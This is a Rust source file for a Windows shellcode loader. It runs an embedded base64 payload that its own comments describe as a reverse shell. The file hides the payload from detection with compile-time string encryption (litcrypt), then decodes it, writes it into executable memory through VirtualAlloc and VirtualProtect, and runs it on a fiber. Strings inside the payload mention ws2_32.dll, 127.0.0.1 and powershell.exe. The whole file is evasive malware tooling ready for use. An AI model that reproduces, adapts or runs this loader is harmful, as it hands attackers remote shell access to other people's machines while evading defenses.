#[macro_use]
extern crate litcrypt2;
extern crate alloc;

use base64::prelude::*;

use std::mem::transmute;
use std::ptr::{copy, null};
use windows_sys::Win32::Foundation::{GetLastError, FALSE};
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::{ConvertThreadToFiber, CreateFiber, SwitchToFiber};
 
use_litcrypt!();

//base64 decoding in rust results in u8 vec being produced from the shellcode. That must be converted to an array of bytes of type u8
fn decode_base64_to_array(base64_string: String) -> Result<[u8; 10880], String> {
    // Decode the Base64 string into a Vec<u8>
    let decoded = base64::decode(base64_string).map_err(|e| e.to_string())?;
     // you must know the original length of the shellcode
     let mut shellcode: [u8; 10880] = [0; 10880];
     shellcode.copy_from_slice(&decoded);  

    Ok(shellcode)
}

#[cfg(target_os = "windows")]
fn main() 
{
    //  let shellcode = include_bytes!("./Rustic64Shell.bin");
    // A base64 encoded Rustic64shell reverse shell is directly passed as input to the lc! macro, which is necessary as it does not accept variables. Results in some very ugly code, but it gets the job done. That is further passed as input to the base64 decoder to convert it to an array of bytes. 
    match decode_base64_to_array(lc!("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")) {
        Ok(shellcode) => {
            println!("Array decoded from b64");
            let shellcode_size = shellcode.len();
            // println!("The size of the sc: {}",shellcode_size);

     unsafe {
         let main_fiber = ConvertThreadToFiber(null());
         if main_fiber.is_null() {
             panic!("[-]ConvertThreadToFiber failed: {}!", GetLastError());
         }
 
         let addr = VirtualAlloc(
             null(),
             shellcode_size,
             MEM_COMMIT | MEM_RESERVE,
             PAGE_READWRITE,
         );
         if addr.is_null() {
             panic!("[-]VirtualAlloc failed: {}!", GetLastError());
         }
 
         let mut old = PAGE_READWRITE;
         copy(shellcode.as_ptr(), addr.cast(), shellcode_size);
         let res = VirtualProtect(addr, shellcode_size, PAGE_EXECUTE, &mut old);
         if res == FALSE {
             panic!("[-]VirtualProtect failed: {}!", GetLastError());
         }
 
         let func = transmute(addr);
         let fiber = CreateFiber(0, func, null());
         if fiber.is_null() {
             panic!("[-]CreateFiber failed: {}!", GetLastError());
         }
 
         SwitchToFiber(fiber);
         SwitchToFiber(main_fiber);
 
     }
        }
        Err(e) => {
            println!("Error: {}", e);
        }
    }
     
}
 
